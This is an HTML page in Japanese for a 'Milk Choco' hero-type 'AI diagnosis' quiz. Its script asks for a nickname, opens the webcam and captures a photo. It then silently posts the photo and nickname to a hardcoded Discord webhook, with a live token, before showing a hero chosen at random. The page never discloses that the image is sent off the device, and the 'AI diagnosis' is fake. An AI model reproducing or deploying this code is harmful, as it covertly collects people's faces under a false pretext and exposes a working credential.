<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ミルクチョコ ヒーロー診断</title>
  <style>
    body {
      background: linear-gradient(to right, #ffffff, #d0eaff);
      text-align: center;
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
    }
    h1 {
      margin-top: 30px;
      font-size: 2em;
      color: #2c3e50;
    }
    #nicknameInput {
      margin-top: 30px;
      padding: 10px;
      font-size: 1.2em;
      border-radius: 10px;
      border: 1px solid #3498db;
      width: 80%;
      max-width: 400px;
    }
    #startButton {
      margin-top: 50px;
      padding: 15px 30px;
      font-size: 1.2em;
      background-color: #3498db;
      border: none;
      border-radius: 10px;
      color: white;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 0 10px #3498db;
    }
    #startButton:hover {
      background-color: #2980b9;
      box-shadow: 0 0 20px #2980b9;
    }
    #result {
      margin-top: 30px;
      font-size: 1.5em;
      color: #222;
      background-color: #ecf0f1;
      display: inline-block;
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 0 10px #aaa;
    }
    video, canvas {
      margin-top: 20px;
      width: 80%;
      max-width: 400px;
      border-radius: 15px;
    }
    #captureButton {
      margin-top: 30px;
      padding: 15px 30px;
      font-size: 1.2em;
      background-color: #27ae60;
      border: none;
      border-radius: 10px;
      color: white;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 0 10px #27ae60;
    }
    #captureButton:hover {
      background-color: #2ecc71;
      box-shadow: 0 0 20px #2ecc71;
    }
  </style>
</head>
<body>

  <h1>あなたにぴったりのヒーローをAI診断！</h1>

  <!-- ニックネーム入力フォーム -->
  <input type="text" id="nicknameInput" placeholder="ニックネームを入力してください" />

  <button id="startButton" disabled>診断スタート！</button>

  <div id="result" style="display:none;"></div>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <button id="captureButton" style="display:none;">撮影する</button>

  <script>
    const heroes = [
      "アサルト", "ボマー", "ゴースト", "メディック", 
      "エレキ", "シールド", "チュチュ", "アイアン", 
      "リーコン", "キャット", "ランチャー"
    ];

    const webhookURL = "https://discord.com/api/webhooks/1365970673616551946/5fJaT3-myLxSwMpJnK4pCgPF91F970Krj3TCH5NA3C5RPGJPFJRKFCWWp_Fe5tyD6eLg"; // 新しいWebhook URL

    const nicknameInput = document.getElementById('nicknameInput');
    const startButton = document.getElementById('startButton');
    const captureButton = document.getElementById('captureButton');
    const result = document.getElementById('result');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // ニックネーム入力があれば診断ボタンを有効化
    nicknameInput.addEventListener('input', () => {
      if (nicknameInput.value.trim() !== '') {
        startButton.disabled = false;
      } else {
        startButton.disabled = true;
      }
    });

    startButton.addEventListener('click', async () => {
      const nickname = nicknameInput.value.trim();
      try {
        // カメラを起動
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = 'block';
        startButton.style.display = 'none';
        captureButton.style.display = 'block';

        // 撮影ボタンのイベントリスナー
        captureButton.addEventListener('click', () => {
          const context = canvas.getContext('2d');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // 画像をデータURLとして取得
          const imageData = canvas.toDataURL('image/png');

          // ランダムにヒーローを選ぶ
          const randomHero = heroes[Math.floor(Math.random() * heroes.length)];

          // Webhookに送信
          fetch(webhookURL, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              content: `【ミルクチョコ診断】${nickname}さんの写真です！`,
              embeds: [{
                title: `${nickname}さんの診断結果`,
                description: `ヒーロータイプ: ${randomHero}`,
                image: { url: imageData }
              }]
            }),
          }).then(() => {
            // 終了後、結果表示とUI更新
            result.textContent = `${nickname}さんは「${randomHero}」タイプです！`;
            result.style.display = 'block';
            captureButton.style.display = 'none'; // 撮影ボタン非表示
            video.style.display = 'none'; // カメラ非表示
          }).catch(error => {
            console.error("Webhook送信に失敗しました", error);
            alert("Webhook送信に失敗しました。");
          });

          // ストリームを停止し、カメラを非表示に
          stream.getTracks().forEach(track => track.stop());
        });

      } catch (error) {
        alert('カメラが使えませんでした。設定を確認してください。');
      }
    });
  </script>

</body>
</html>
